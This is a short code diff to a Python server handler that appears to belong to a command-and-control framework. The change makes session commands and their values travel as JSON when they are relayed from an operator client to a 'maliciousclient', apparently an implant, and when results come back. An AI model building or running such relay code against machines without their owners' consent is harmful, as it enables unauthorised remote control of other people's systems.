@@ -644,8 +644,9 @@ class ServerFriendlyClientHandler:
                     ## validate JSON?
 
 
-                    #session_command = raw_session_message.split("\\|/")[2]
+                    ## Special variables for sessions only
                     session_command = dict_session_message["Main"]["msg"]["msg_content"]["command"]
+                    session_command_value = dict_session_message["Main"]["msg"]["msg_content"]["value"]
 
                     ## Strip JSON of any sensitive data (makes it so the messages from Fclient can be passed
                     ## directly to the Mclient without an additional parser here. Orrrrr just don't send it in the first
@@ -671,7 +672,10 @@ class ServerFriendlyClientHandler:
                     if session_command == "break":
                         logging.debug(f"[Server (session: {self.client.fullname})] : Session breaking")
                     else:
-                        self.client.send_msg_to_maliciousclient(session_command)
+                        ## Get JSON-ified
+                        #self.client.send_msg_to_maliciousclient(session_command)
+                        self.client.send_msg_to_maliciousclient(self.json_format(cmd=session_command, cmd_value=session_command_value))
+
                         ##listening back for response
                         results = self.client.recieve_msg_from_maliciousclient()
                         ## sending JSON from client directly back to fclient, which will handle the parsing
